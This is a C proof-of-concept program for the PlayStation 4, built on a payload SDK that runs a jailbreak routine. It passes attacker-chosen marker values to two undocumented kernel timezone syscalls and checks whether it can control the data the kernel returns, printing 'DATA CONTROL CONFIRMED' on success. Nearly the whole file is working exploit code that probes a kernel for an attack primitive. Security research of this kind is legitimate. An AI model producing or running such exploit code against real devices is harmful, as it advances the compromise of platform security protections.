#include "ps4.h"

#define SYS_SET_TIMEZONE_INFO 636
#define SYS_UTC_TO_LOCALTIME  638

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== timezone data control PoC ===\n");

    static uint8_t data[512 * 16];
    memset(data, 0, sizeof(data));

    struct entry {
        long  timestamp;
        int   offset;
        int   dst_offset;
    } *entries = (struct entry*)data;

    entries[0].timestamp  = 0x0;
    entries[0].offset     = 0x41414141;
    entries[0].dst_offset = 0x42424242;

    entries[1].timestamp  = 0x7FFFFFFF;
    entries[1].offset     = 0x43434343;
    entries[1].dst_offset = 0x44444444;

    struct {
        void*    ptr;
        uint32_t count;
    } set_args = {
        .ptr   = data,
        .count = 2
    };

    int r = syscall(SYS_SET_TIMEZONE_INFO, &set_args);
    printf_debug("set_timezone r=%d\n", r);

    long result = 0;
    struct {
        long  timestamp;
        long* out_time;
        void* out_info;
        int*  out_dst;
    } utc_args = {
        .timestamp = 0x1000,
        .out_time  = &result,
        .out_info  = NULL,
        .out_dst   = NULL,
    };

    r = syscall(SYS_UTC_TO_LOCALTIME, &utc_args);
    printf_debug("utc_to_localtime r=%d\n", r);
    printf_debug("result = 0x%lx\n", result);

    if (result == (long)(0x1000 + 0x41414141)) {
        printf_debug("[+] DATA CONTROL CONFIRMED!\n");
    }

    return 0;
}